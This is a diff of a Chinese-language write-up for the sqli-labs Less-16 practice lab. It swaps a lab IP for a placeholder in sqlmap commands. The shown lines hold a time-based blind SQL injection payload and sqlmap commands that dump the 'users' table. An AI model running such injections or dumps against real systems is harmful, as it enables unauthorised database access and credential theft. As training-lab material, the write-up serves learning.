@@ -12,8 +12,8 @@ admin") and if(1=1,sleep(5),0) #
 ---
 
 用sqlmap跑
-sqlmap -u "http://10.3.187.26:8848/Less-16/"  --data="uname=admin&passwd=admin"  --batch --string="flag.jpg" --threads=5  --technique=T --level=5
+sqlmap -u "http://ip:8848/Less-16/"  --data="uname=admin&passwd=admin"  --batch --string="flag.jpg" --threads=5  --technique=T --level=5
   ![](assets/Less-16/file-20260531134701103.png)
 ...
 
-sqlmap -u "http://10.3.187.26:8848/Less-16/" --data="uname=admin&passwd=admin" --batch --string="flag.jpg" --threads=5 -D security -T users --dump --level=5 #爆数据 
+sqlmap -u "http://ip:8848/Less-16/" --data="uname=admin&passwd=admin" --batch --string="flag.jpg" --threads=5 -D security -T users --dump --level=5 #爆数据 
